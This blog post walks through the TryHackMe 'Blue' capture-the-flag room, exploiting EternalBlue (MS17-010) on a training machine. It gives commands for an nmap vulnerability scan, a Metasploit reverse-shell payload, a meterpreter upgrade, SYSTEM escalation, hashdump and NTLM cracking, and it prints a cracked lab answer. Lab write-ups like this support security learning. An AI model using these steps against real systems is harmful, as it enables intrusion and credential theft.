---
layout: blog
title: THM Blue Writeup
publishDate: 2023-12-02T23:15:00.000Z
description: Step by step walkthrough of the TryHackMe Blue room. This is an
  easy windows machine based on the EternalBlue exploit (CVE-2017-0144).
tags:
  - tryhackme
  - writeup
---
EternalBlue is a computer exploit developed by the U.S. National Security Agency (NSA). It was leaked by the Shadow Brokers hacker group on April 14, 2017, one month after Microsoft released patches for the vulnerability.
[EternalBlue - Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)

## Task 1

Scan all open ports for vulnerabilities using Nmap.

```sh
nmap -sV -vv --script vuln TARGET_IP -oN nmap/blue
```

## Task 2

Run Metasploit. Search for MS17-010 exploits and select the appropriate one. Set RHOSTS to the target's IP address.

```sh
set payload windows/x64/shell/reverse_tcp
```

Run the exploit to get shell access. 

## Task 3

To upgrade the shell to meterpreter, first background the shell (Ctrl+Z). Check the session ID using `sessions` command. 
Note the session ID and run:

```sh
sessions -u <session-id>
```

This command should use the post module `post/multi/manage/shell_to_meterpreter` to upgrade the selected session.

Verify that we have escalated to `NT AUTHORITY\SYSTEM`. Run `getsystem` to confirm this.

![](/images/uploads/screenshot-2025-03-21-232450.png)

Migrate to this process using the `migrate PROCESS_ID` command, where process ID can be any process running on `NT AUTHORITY\SYSTEM`. List all processes by running `ps`.

![](/images/uploads/screenshot-2025-03-21-232513.png)

## Task 4

Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the passwords on the machine as long as we have the correct privileges to do so.

![](/images/uploads/screenshot-2025-03-21-232527.png)

To crack the password of user 'Jon', extract the NTLM hash and use [CrackStation](https://crackstation.net/)

![](/images/uploads/screenshot-2025-03-21-232544.png)

*84ck_783_914n37*
